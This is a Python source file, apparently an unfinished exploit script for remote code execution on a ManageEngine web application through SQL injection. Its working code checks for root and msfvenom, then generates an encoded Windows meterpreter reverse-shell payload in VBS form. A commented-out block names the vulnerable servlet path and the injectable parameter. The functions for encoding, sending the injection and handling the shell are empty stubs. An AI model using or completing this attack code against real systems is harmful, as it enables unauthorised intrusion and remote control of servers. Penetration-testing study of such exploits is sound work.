"""
Author: Aleksa Zatezalo.
Date: September 2024.
Title: Managed Engine RCE.
Description: An RCE for the Manged Engine Web Application via SQL. Coded to run on linux systems with msfvenom installed.
"""

import sys
import requests
import urllib3
import os
from termcolor import colored
import subprocess



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Check dependendies
def checkOS():
	"""
	Checks OS. Exists program if not linux.
	"""

	if not(sys.platform == "linux" or sys.platform == "linux2"):
		print(colored("[-] OS Is Not Linux. Exiting program", 'red'))
		exit(1)
	else:
		print(colored("[+] OS Is Linux", 'green'))
	
	return True

def checkSuperUser():
	"""
	Checks if user is superuser.
	"""

	if os.geteuid() != 0:
		print(colored("[-] Does not have the correct priveledges. Exiting program", 'red'))
		exit(1)
	print(colored("[+] User is root", 'green'))
	return True

def chechMsfVenom():
	"""
	Checks if MSFVenom is installed on the system.
	"""

	rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
	if rc == 0:
		print(colored("[+] Msfvenom Installed", 'green'))
	else:
		print(colored("[-] Msfvenom missing", 'red'))
		exit(1)

	return True

# String Operation Functions
def genSQLi(lhost, lport):
	"""
	Creates a vbs exploit 
	"""
	print(colored("[+] Generating exploit. Be patient...", 'green'))
	command = "msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -e x86/shikata_ga_nai -f vbs".format(host=lhost, port=lport)
	process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
	output = process.communicate()
	print(colored("[+] Generating rev shell for {host}:{port}".format(host=lhost, port=lport), 'green'))
	return output


def makeOneLineString(string):
	"""
	Converts a string into one-line of vbs code.
	"""
	pass

def makeOneLineFile(file):
	"""
	Opens vbs file and returns as one line vbs string.
	"""
	pass

def encode(contents):
	"""
	Take contents of VBS file then URL encodes it after base64 encoding it.
	The duel encoded string is returned.
	"""
	pass

# Send Request Functions
def sendSQLi(rhost, rport, lhost, lport):
	"""
	Sends SQLi to rhost:rport containing a reverse shell. 
	"""
	pass

# Socket Functions
def openSocket():
	pass

def reciveCommands():
	pass

def sendCommand():
	pass

# Main Functions
def main():
	checkOS()
	checkSuperUser()
	chechMsfVenom()
	string = genSQLi('127.0.0.1', '4444')
	print(string)
	# if len(sys.argv) != 2:
	# 	print("(+) usage %s <target>" % sys.argv[0])
	# 	print ("(+) eg: %s target" % sys.argv[0])
	# 	sys.exit(1)
	
	# t = sys.argv[1]
	
	# sqli = ";"

	# r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
	# 				  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	# print(r.text)
	# print(r.headers)

if __name__ == '__main__':
	main()